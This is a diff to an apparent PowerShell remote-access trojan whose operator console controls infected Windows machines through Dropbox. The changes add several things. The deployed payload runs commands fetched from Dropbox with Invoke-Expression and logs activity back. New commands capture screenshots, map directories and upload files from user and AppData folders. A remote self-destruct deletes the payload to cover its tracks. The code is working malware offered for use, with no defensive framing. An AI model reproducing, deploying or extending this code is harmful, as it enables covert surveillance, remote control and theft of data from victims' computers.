@@ -12,17 +12,23 @@ $CurrentProfile = $null
 
 function Show-Help {
     Write-Host "`nAvailable commands:" -ForegroundColor White
-    Write-Host "  profile-new     - Create a new profile" -ForegroundColor White
-    Write-Host "  profile-set     - Select an existing profile" -ForegroundColor White
-    Write-Host "  profile-del     - Delete a profile" -ForegroundColor White
-    Write-Host "  profile-list    - List all available profiles" -ForegroundColor White
-    Write-Host "  profile-details - Show details of current profile" -ForegroundColor White
-    Write-Host "  send            - Send a command" -ForegroundColor White
-    Write-Host "  deploy          - Create the payload" -ForegroundColor White
-    Write-Host "  wrap            - Create a vbs file that hides the payload" -ForegroundColor White
-    Write-Host "  clear           - Clear the screen" -ForegroundColor White
-    Write-Host "  help            - Show this help message" -ForegroundColor White
-    Write-Host "  exit            - Exit the application" -ForegroundColor White
+    Write-Host "  profile-add      - Create a new profile" -ForegroundColor White
+    Write-Host "  profile-set      - Select an existing profile" -ForegroundColor White
+    Write-Host "  profile-del      - Delete a profile" -ForegroundColor White
+    Write-Host "  profile-list     - List all available profiles" -ForegroundColor White
+    Write-Host "  profile-details  - Show details of current profile" -ForegroundColor White
+    Write-Host ""
+    Write-Host "  cmd              - Send a command" -ForegroundColor White
+    Write-Host "  screenshot       - Capture a screenshot" -ForegroundColor White
+    Write-Host "  tree             - Capture tree output" -ForegroundColor White
+    Write-Host "  download         - Download a file" -ForegroundColor White
+    Write-Host "  selfdestruct /pc - Self destruct payloads" -ForegroundColor White
+    Write-Host ""
+    Write-Host "  deploy           - Create the payload" -ForegroundColor White
+    Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
+    Write-Host "  clear            - Clear the screen" -ForegroundColor White
+    Write-Host "  help             - Show this help message" -ForegroundColor White
+    Write-Host "  exit             - Exit the application" -ForegroundColor White
     Write-Host ""
 }
 
@@ -172,15 +178,25 @@ function Profile-Details {
 }
 
 function Send-Command {
-    param([string]$FilePath = $ProfileFile)
+    param(
+        [string]$FilePath = $ProfileFile,
+        [string]$CommandString
+    )
 
-    if (-not $CurrentProfile) { 
+    if (-not $CurrentProfile) {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return 
     }
 
-    $Command = Read-Host "`nEnter command"
-    Write-Host ""
+    if (-not $CommandString) {
+        $Command = Read-Host "Cmd"
+        if ($Command.Trim() -eq "") {
+            Write-Host "No command entered" -ForegroundColor DarkRed
+            return
+        }
+    } else {
+        $Command = $CommandString
+    }
 
     $CmdFile = "cmd.txt"
     Set-Content -Path $CmdFile -Value $Command -Encoding UTF8
@@ -231,10 +247,68 @@ function Send-Command {
     Write-Host ""
 }
 
+function Send-SelfDestruct {
+    param(
+        [string]$FilePath = $ProfileFile,
+        [string]$TargetComputer = $null
+    )
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    try {
+        Write-Host "Getting access token..." -ForegroundColor White
+
+        $tokenUri = "https://api.dropbox.com/oauth2/token"
+        $body = @{
+            grant_type = "refresh_token"
+            refresh_token = $CurrentProfile.RefreshToken
+            client_id = $CurrentProfile.AppKey
+            client_secret = $CurrentProfile.AppSecret
+        }
+
+        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
+        $accessToken = $response.access_token
+
+        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen
+
+        Write-Host "Uploading file..." -ForegroundColor White
+
+        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
+        $headers = @{
+            "Authorization" = "Bearer $accessToken"
+            "Dropbox-API-Arg" = '{"path":"/selfdestruct.txt","mode":"overwrite","autorename":false,"mute":false}'
+            "Content-Type" = "application/octet-stream"
+        }
+
+        $fileContent = if ($TargetComputer) { "/$TargetComputer" } else { "" }
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+
+        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes
+
+        if ($TargetComputer) {
+            Write-Host "Self destruct command sent for computer: $TargetComputer" -ForegroundColor DarkGreen
+        } else {
+            Write-Host "Self destruct command sent for ALL computers" -ForegroundColor DarkGreen
+        }
+        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
+        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White
+
+    } catch {
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
+        if ($_.ErrorDetails.Message) {
+            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
+        }
+    }
+
+    Write-Host ""
+}
+
 function Deploy-Script {
     param([string]$FilePath = $ProfileFile)
 
-    if (-not $CurrentProfile) { 
+    if (-not $CurrentProfile) {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return
     }
@@ -258,19 +332,27 @@ function Deploy-Script {
         return
     }
 
-    $responseTime = Read-Host "`nEnter response time in seconds"
-    Write-Host ""
+    $responseTime = Read-Host "`nResponse time"
 
     if (-not ($responseTime -match '^\d+$')) {
         Write-Host "Invalid response time" -ForegroundColor DarkRed
         return
     }
 
+    $pingDelay = Read-Host "Ping delay"
+
+    if (-not ($pingDelay -match '^\d+$')) {
+        Write-Host "Invalid ping delay" -ForegroundColor DarkRed
+        return
+    }
+
+    Write-Host ""
+
     $batchContent = @"
 <# :
 @echo off
 setlocal enabledelayedexpansion
-
+set SCRIPT_PATH=%~f0
 powershell -noprofile -executionpolicy bypass -command "iex (Get-Content -Raw '%~f0')"
 exit /b
 : #>
@@ -281,6 +363,12 @@ Add-Type -AssemblyName System.Web
 `$refreshToken = "$($CurrentProfile.RefreshToken)"
 `$accessToken = `$null
 `$responseTime = $responseTime
+`$pingDelay = $pingDelay
+`$computerName = `$env:COMPUTERNAME
+`$logFileName = "log_`${computerName}.txt"
+`$lastPingTime = Get-Date
+`$startupTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+
 function Get-AccessToken {
     `$uri = "https://api.dropbox.com/oauth2/token"
     `$body = @{
@@ -298,17 +386,18 @@ function Get-AccessToken {
         return `$null
     }
 }
+
 function Check-DropboxFile {
-    param(`$accessToken)
+    param(`$accessToken, `$fileName)
     `$uri = "https://api.dropboxapi.com/2/files/list_folder"
-    `$headers = @{ 
+    `$headers = @{
         Authorization = "Bearer `$accessToken"
         "Content-Type" = "application/json"
     }
     `$body = @{ path = "" } | ConvertTo-Json
     try {
         `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
-        return (`$response.entries | Where-Object { `$_.name -eq "cmd.txt" })
+        return (`$response.entries | Where-Object { `$_.name -eq `$fileName })
     }
     catch {
         if (`$_.Exception.Response.StatusCode -eq 401) {
@@ -318,10 +407,35 @@ function Check-DropboxFile {
         return `$null
     }
 }
+
+function Upload-File {
+    param(`$accessToken, `$localContent, `$remotePath)
+    `$uri = "https://content.dropboxapi.com/2/files/upload"
+    `$apiArg = @{
+        path = `$remotePath
+        mode = "overwrite"
+        autorename = `$true
+        mute = `$true
+    } | ConvertTo-Json -Compress
+    `$headers = @{
+        Authorization = "Bearer `$accessToken"
+        "Dropbox-API-Arg" = `$apiArg
+        "Content-Type" = "application/octet-stream"
+    }
+    try {
+        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$localContent
+        return `$true
+    }
+    catch {
+        Write-Host "Failed to upload file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
+        return `$false
+    }
+}
+
 function Read-FileContent {
-    param(`$accessToken)
+    param(`$accessToken, `$filePath = "/cmd.txt")
     `$uri = "https://content.dropboxapi.com/2/files/download"
-    `$apiArg = @{ path = "/cmd.txt" } | ConvertTo-Json -Compress
+    `$apiArg = @{ path = `$filePath } | ConvertTo-Json -Compress
     `$headers = @{
         Authorization = "Bearer `$accessToken"
         "Dropbox-API-Arg" = `$apiArg
@@ -343,14 +457,15 @@ function Read-FileContent {
         return `$null
     }
 }
+
 function Delete-File {
-    param(`$accessToken)
+    param(`$accessToken, `$filePath = "/cmd.txt")
     `$uri = "https://api.dropboxapi.com/2/files/delete_v2"
-    `$headers = @{ 
+    `$headers = @{
         Authorization = "Bearer `$accessToken"
         "Content-Type" = "application/json"
     }
-    `$body = @{ path = "/cmd.txt" } | ConvertTo-Json
+    `$body = @{ path = `$filePath } | ConvertTo-Json
     try {
         Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body | Out-Null
         return `$true
@@ -360,6 +475,47 @@ function Delete-File {
         return `$false
     }
 }
+
+function Append-ToLog {
+    param(`$accessToken, `$message)
+    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
+    `$newContent = `$message
+    if (`$logFile) {
+        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
+        if (`$existingContent) {
+            `$newContent = `$existingContent + "`n" + `$message
+        }
+    }
+    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
+    if (-not `$success) {
+        Write-Host "Failed to append to log file" -ForegroundColor DarkRed
+    }
+}
+
+function Update-LastPing {
+    param(`$accessToken)
+    `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    `$newFirstLine = "# LAST PING ON `$currentTime"
+    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
+    `$newContent = `$newFirstLine
+    if (`$logFile) {
+        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
+        if (`$existingContent) {
+            `$contentArray = `$existingContent -split "`n"
+            if (`$contentArray.Count -gt 1) {
+                `$contentArray[0] = `$newFirstLine
+                `$newContent = `$contentArray -join "`n"
+            }
+        }
+    }
+    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
+    if (-not `$success) {
+        Write-Host "Failed to update last ping" -ForegroundColor DarkRed
+    } else {
+        Write-Host "Updated last ping for `$logFileName" -ForegroundColor White
+    }
+}
+
 function Process-CommandFile {
     param(`$accessToken)
     `$command = Read-FileContent -accessToken `$accessToken
@@ -370,12 +526,58 @@ function Process-CommandFile {
     try {
         Write-Host "Executing command: `$command" -ForegroundColor White
         Invoke-Expression `$command
+        `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        `$commandLogMessage = "# EXECUTED COMMAND ON `$(`$currentTime)`n`$(`$command)"
+        Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
     }
     catch {
         Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
     }
     Delete-File -accessToken `$accessToken | Out-Null
 }
+
+function Check-SelfDestruct {
+    param(`$accessToken)
+    `$selfDestructFile = Check-DropboxFile -accessToken `$accessToken -fileName "selfdestruct.txt"
+    if (`$selfDestructFile) {
+        `$selfDestructContent = Read-FileContent -accessToken `$accessToken -filePath "/selfdestruct.txt"
+        if (-not `$selfDestructContent) {
+            `$selfDestructContent = ""
+        }
+        `$shouldSelfDestruct = `$false
+        if (`$selfDestructContent.Trim() -eq "") {
+            `$shouldSelfDestruct = `$true
+            Write-Host "General self-destruct command received" -ForegroundColor DarkYellow
+        } else {
+            `$targetComputer = `$selfDestructContent.Trim()
+            if (`$targetComputer.StartsWith("/")) {
+                `$targetComputer = `$targetComputer.Substring(1)
+            }
+            if (`$env:COMPUTERNAME -eq `$targetComputer) {
+                `$shouldSelfDestruct = `$true
+                Write-Host "Targeted self-destruct command received for this computer" -ForegroundColor DarkYellow
+            } else {
+                Write-Host "Self-destruct command received, but targeted for: `$targetComputer" -ForegroundColor DarkYellow
+            }
+        }
+        if (`$shouldSelfDestruct) {
+            Write-Host "Initiating self-destruct sequence..." -ForegroundColor DarkYellow
+            Delete-File -accessToken `$accessToken -filePath "/selfdestruct.txt" | Out-Null
+            `$scriptPath = `$MyInvocation.MyCommand.Path
+            if (-not `$scriptPath) {
+                `$scriptPath = `$env:SCRIPT_PATH
+                if (-not `$scriptPath) {
+                    Write-Host "Error: Script path not found." -ForegroundColor DarkRed
+                    return
+                }
+            }
+            `$deleteCommand = 'cmd /c "timeout /t 3 /nobreak > Nul & del /f /q "' + `$scriptPath + '"'
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", `$deleteCommand -WindowStyle Hidden
+            exit
+        }
+    }
+}
+
 while (`$true) {
     if (-not `$accessToken) {
         `$accessToken = Get-AccessToken
@@ -384,14 +586,24 @@ while (`$true) {
             Start-Sleep 5
             continue
         }
+        Update-LastPing -accessToken `$accessToken
+        `$startupMessage = "# STARTUP ON `$startupTime"
+        Append-ToLog -accessToken `$accessToken -message `$startupMessage
+        Write-Host "Startup logged: `$startupMessage" -ForegroundColor White
     }
     try {
-        `$file = Check-DropboxFile -accessToken `$accessToken
+        Check-SelfDestruct -accessToken `$accessToken
+        `$file = Check-DropboxFile -accessToken `$accessToken -fileName "cmd.txt"
         if (`$file) {
             Write-Host "Found command, processing..." -ForegroundColor DarkGreen
             Process-CommandFile -accessToken `$accessToken
         } else {
-            Write-Host "Checking again in `$responseTime seconds..." -ForegroundColor White
+            Write-Host "Checking every `$responseTime seconds..." -ForegroundColor White
+        }
+        `$currentTime = Get-Date
+        if ((`$currentTime - `$lastPingTime).TotalSeconds -ge `$pingDelay) {
+            Update-LastPing -accessToken `$accessToken
+            `$lastPingTime = `$currentTime
         }
     }
     catch {
@@ -410,7 +622,7 @@ while (`$true) {
 function Wrap-Script {
     param([string]$FilePath = $ProfileFile)
 
-    $payloadPath = Read-Host "`nEnter payload path"
+    $payloadPath = Read-Host "Payload path"
     $payloadPath = $payloadPath.Trim('"')
     $escapedPath = $payloadPath -replace '"', '""'
 
@@ -435,21 +647,166 @@ function Clear-Screen {
     }
 }
 
+function Cmd-Screenshot {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    $command = @"
+# CMD-SCREENSHOT
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+`$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+`$bitmap = New-Object System.Drawing.Bitmap `$screen.Width, `$screen.Height
+`$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap)
+`$graphics.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$bitmap.Size)
+`$graphics.Dispose()
+`$memoryStream = New-Object System.IO.MemoryStream
+`$bitmap.Save(`$memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+`$screenshotBytes = `$memoryStream.ToArray()
+`$memoryStream.Dispose()
+`$bitmap.Dispose()
+`$computerName = `$env:COMPUTERNAME
+`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+`$fileName = "screenshot_`${computerName}_`${timeStamp}.png"
+`$uri = "https://content.dropboxapi.com/2/files/upload"
+`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
+`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
+Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$screenshotBytes
+"@
+
+    Send-Command -CommandString $command
+}
+
+function Cmd-Tree {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    Write-Host " 1. C:" -ForegroundColor White
+    Write-Host " 2. User" -ForegroundColor White
+    Write-Host " 3. Custom" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "Scan"
+    Write-Host ""
+
+    $path = ""
+    switch ($choice) {
+        "1" { $path = "C:\" }
+        "2" { $path = "`$env:USERPROFILE" }
+        default {
+            $customPath = Read-Host "Path"
+            $path = "$customPath" 
+        }
+    }
+
+    $command = @"
+# CMD-TREE
+function Get-TreeStructure {
+param(`$Path, `$IndentLevel = 0)
+`$output = @()
+`$items = Get-ChildItem -Path `$Path | Sort-Object Name
+foreach (`$item in `$items) {
+`$indent = "  " * `$IndentLevel
+if (`$item.PSIsContainer) {
+`$output += "`$indent[`$(`$item.Name)]/"
+`$output += Get-TreeStructure -Path `$item.FullName -IndentLevel (`$IndentLevel + 1)
+} else {
+`$output += "`$indent`$(`$item.Name) (`$(`$item.Length) bytes)"
+}
+}
+return `$output
+}
+`$treeOutput = @("Tree for: $path", "")
+`$treeOutput += Get-TreeStructure -Path "$path"
+`$treeText = `$treeOutput -join "`r`n"
+`$computerName = `$env:COMPUTERNAME
+`$timeStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+`$fileName = "tree_`${computerName}_`${timeStamp}.txt"
+`$uri = "https://content.dropboxapi.com/2/files/upload"
+`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
+`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
+`$bytes = [System.Text.Encoding]::UTF8.GetBytes(`$treeText)
+Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$bytes
+"@
+
+    Send-Command -CommandString $command
+}
+
+function Cmd-Download {
+    if (-not $CurrentProfile) {
+        Write-Host "No profile selected" -ForegroundColor DarkRed
+        return 
+    }
+
+    Write-Host " 1. User" -ForegroundColor White
+    Write-Host " 2. AppData (Roaming)" -ForegroundColor White
+    Write-Host " 3. AppData (Local)" -ForegroundColor White
+    Write-Host " 4. Custom" -ForegroundColor White
+    Write-Host ""
+
+    $choice = Read-Host "Starting path"
+    Write-Host ""
+
+    $filePath = ""
+
+    switch ($choice) {
+        "1" {
+            $fileName = Read-Host "USERPROFILE\"
+            $filePath = "`$env:USERPROFILE\$fileName"
+        }
+        "2" {
+            $fileName = Read-Host "APPDATA\"
+            $filePath = "`$env:APPDATA\$fileName"
+        }
+        "3" {
+            $fileName = Read-Host "LOCALAPPDATA\"
+            $filePath = "`$env:LOCALAPPDATA\$fileName"
+        }
+        default {
+            $filePath = Read-Host "Path"
+        }
+    }
+    $filePath = $filePath -replace '"', ''
+
+    $downloadCommand = @"
+# CMD-DOWNLOAD
+`$filePath = "$filePath"
+if (Test-Path `$filePath) {
+`$originalName = [System.IO.Path]::GetFileName(`$filePath)
+`$fileName = "`$originalName"
+`$fileContent = [System.IO.File]::ReadAllBytes(`$filePath)
+`$uri = "https://content.dropboxapi.com/2/files/upload"
+`$apiArg = @{path = "/`$fileName"; mode = "overwrite"; autorename = `$true; mute = `$true} | ConvertTo-Json -Compress
+`$headers = @{Authorization = "Bearer `$accessToken"; "Dropbox-API-Arg" = `$apiArg; "Content-Type" = "application/octet-stream"}
+Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$fileContent
+"File uploaded successfully: `$fileName"
+} else {
+"File not found: `$filePath"
+}
+"@
+
+    Send-Command -CommandString $downloadCommand
+}
+
 $exitRequested = $false
 
-Write-Host "   __________________________ " -ForegroundColor DarkBlue
-Write-Host "  /  _  \__    ___/\______   \" -ForegroundColor DarkBlue
-Write-Host " /  /_\  \|    |    |       _/" -ForegroundColor DarkBlue
-Write-Host "/    |    \    |    |    |   \" -ForegroundColor DarkBlue
-Write-Host "\____|__  /____|    |____|_  /" -ForegroundColor DarkBlue
-Write-Host "        \/                 \/ " -ForegroundColor DarkBlue
+Write-Host '    e Y8b  88P''888''Y88 888 88e ' -ForegroundColor DarkBlue
+Write-Host '   d8b Y8b P''  888  ''Y 888 888D' -ForegroundColor DarkBlue
+Write-Host '  d888b Y8b    888     888 88"' -ForegroundColor DarkBlue
+Write-Host ' d888888888b   888     888 b,  ' -ForegroundColor DarkBlue
+Write-Host 'd8888888b Y8b  888     888 88b,' -ForegroundColor DarkBlue
+Write-Host ""
 
 while (-not $exitRequested) {
-    if ($CurrentProfile) { 
-        Write-Host -NoNewline "@$($CurrentProfile.Name) > " -ForegroundColor DarkBlue
+    if ($CurrentProfile) {
+        Write-Host -NoNewline "#$($CurrentProfile.Name) > " -ForegroundColor DarkBlue
     }
-    else { 
-        Write-Host -NoNewline "@ > " -ForegroundColor DarkBlue
+    else {
+        Write-Host -NoNewline "# > " -ForegroundColor DarkBlue
     }
 
     $InputLine = Read-Host
@@ -458,29 +815,45 @@ while (-not $exitRequested) {
     $Args = if ($InputParts.Count -gt 1) { $InputParts[1] } else { "" }
 
     switch -regex ($Command) {
-        "^(profile-new|p-new)$" { 
+        "^(profile-add|p-add|profile-new|p-new)$" {
             Profile-New 
         }
-        "^(profile-set|p-set)$" { 
+        "^(profile-set|p-set|p-s|p)$" {
             $Selected = Profile-Set
-            if ($Selected) { 
+            if ($Selected) {
                 $CurrentProfile = $Selected
                 Write-Host "Profile set to: $($CurrentProfile.Name)" -ForegroundColor DarkGreen
             }
         }
-        "^(profile-del|p-del)$" {
+        "^(profile-del|p-del|profile-remove|p-remove|p-rem)$" {
             Profile-Del
         }
-        "^(profile-list|p-list)$" {
+        "^(profile-list|p-list|p-l)$" {
             Profile-List
         }
-        "^(profile-details|p-details)$" {
+        "^(profile-details|p-details|p-d)$" {
             Profile-Details
         }
-        "^send$" {
+        "^(cmd|c)$" {
             Send-Command
         }
-        "^deploy$" {
+        "^(screenshot|ss)$" {
+            Cmd-Screenshot
+        }
+        "^(tree)$" {
+            Cmd-Tree
+        }
+        "^(download|dwn|get)$" {
+            Cmd-Download
+        }
+        "^selfdestruct$" {
+            $targetComputer = $null
+            if ($Args) {
+                $targetComputer = $Args -replace '^/+', ''
+            }
+            Send-SelfDestruct -TargetComputer $targetComputer
+        }
+        "^(deploy|d)$" {
             Deploy-Script
         }
         "^wrap$" {
